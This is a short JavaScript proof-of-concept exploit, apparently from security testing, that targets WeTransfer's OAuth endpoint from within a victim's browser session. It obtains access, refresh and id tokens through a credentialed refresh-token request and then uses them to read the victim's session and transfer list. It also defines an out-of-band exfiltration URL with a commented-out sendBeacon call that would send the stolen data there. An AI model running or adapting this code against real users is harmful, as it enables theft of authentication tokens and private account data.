const EXFIL_URL = 'https://0jik82y5uzt15l0l8n1yaw137185g83b0.oast.site/exfil';

(async () => {
  const results = { attack: 'refresh_token_theft', domain: document.domain, ts: Date.now() };

  try {
    // Step 1: Steal access_token + refresh_token via refresh_token grant
    const tokenResp = await fetch('https://auth.wetransfer.com/oauth/token', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        grant_type: 'refresh_token',
        client_id: 'dXWFQjiW1jxWCFG0hOVpqrk4h9vGeanc',
        audience: 'aud://transfer-api-prod.wetransfer/'
      })
    });
    const tokenData = await tokenResp.json();
    results.token = { status: tokenResp.status, access_token: tokenData.access_token, refresh_token: tokenData.refresh_token, id_token: tokenData.id_token };

    // Step 2: Use stolen token to read victim's account data
    if (tokenData.access_token) {
      const sessionResp = await fetch('/api/v4/auth/session', {
        headers: { 'Authorization': 'Bearer ' + tokenData.access_token }
      });
      results.session = { status: sessionResp.status, body: await sessionResp.json() };

      const transfersResp = await fetch('/api/v4/transfers', {
        headers: { 'Authorization': 'Bearer ' + tokenData.access_token }
      });
      results.transfers = { status: transfersResp.status, body: await transfersResp.json() };
    }
  } catch (e) {
    results.error = e.message;
  }
  document.writeln('<pre>' + JSON.stringify(results, null, 2) + '</pre>');

  // Exfiltrate
//   navigator.sendBeacon(EXFIL_URL, JSON.stringify(results));
})();
